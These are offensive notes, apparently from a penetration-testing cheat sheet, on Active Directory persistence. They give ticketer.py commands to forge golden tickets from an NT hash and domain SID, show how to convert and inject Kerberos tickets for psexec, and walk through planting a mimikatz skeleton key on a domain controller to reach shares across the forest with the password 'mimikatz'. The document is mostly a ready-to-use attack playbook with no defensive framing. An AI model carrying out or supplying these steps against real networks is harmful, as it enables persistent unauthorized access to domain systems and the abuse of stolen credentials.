AD backdoor and Persistance
Golden Tickets are also form of persistance
If we have a users sid and hash we can create ticket on linux and then convert the .ccache ticket to kirbi and use on target

    python ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain domain.name username

We can convert ticket format to .ccache if we want to use with tools like psexec smbexec ,crackmapexec directly in session. .kirbi format only works in windows so if we use this,it will make some noise

    Ticket formats converting(linux and windows)

we can use ticket_converter.py to convert the types ccache is compatible with linux and kirbi with windows

python ticket_converter.py ticket.kirbi ticket.ccache python ticket_converter.py ticket.ccache ticket.kirbi

To inject the ticket directly in our sessions from linux

    export KRB5CCNAME=ticket.ccache

KRB5CCNAME is a env variable used to store ticket path

now we can use any tool like smbexec,crackmapexec etc and pass the -k flag which will automatically include ticket from env var .

    python psexec.py domain.name/user@TARGETIP-k -no-pass

Skeleton Key Overview -

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.

This attack requires atleast loacal administrator priveleges

    Run mimikatz to get in its shell

    mimikatz.exe

    check our priveleges that if we can perfrom this attack or not

    privilege::debug

    Now we implant the skeleton key in the AD Forest

    misc::skeleton This allows us to access any share of any machine on any domain in the forest without ever enumurating it from the start beccause we already have a golden ticket and we make our access more easy

Accessing the Forest

The default credentials will be: "mimikatz"

We can now make admin shares for our current user with elevated privileges persistent.we can configure any shares to accept us without authentication by follwoing command example

example: net use c:\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password

example: dir \Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
Active Directory Post Exploitation

After we are a domain admin, now our goal is to gather as much information as possible

    One way we can do is by rdp into the machine and then using windows server manager as it allows the management of whole domain in a AD environment

    The most useful feature of windows server in post exploitation is going in tools tab and then enumerating different things going around on network

    One important is the users and computers information tool whihc shows active users and sometimes people leave their passswords in the description so they dont forget
